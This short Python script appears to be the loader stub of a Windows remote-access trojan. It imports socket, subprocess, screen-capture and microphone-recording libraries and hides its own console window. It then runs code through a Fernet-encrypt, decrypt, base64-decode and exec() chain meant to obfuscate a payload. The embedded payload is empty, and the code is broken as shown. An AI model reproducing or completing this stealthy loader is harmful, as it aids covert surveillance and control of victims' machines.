
import base64
from cryptography.fernet import Fernet
import base64
import socket
import os
import json
import subprocess
import base64
import sys
import pyautogui
import tempfile
import shutil
import sys
import time
import threading
from scipy.io.wavfile import write
import sounddevice
import win32gui, win32con
the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
anahtar=Fernet.generate_key()
f=Fernet(anahtar)
t=f.encrypt('''

''')
exec(base64.b64decode(f.decrypt(t)))
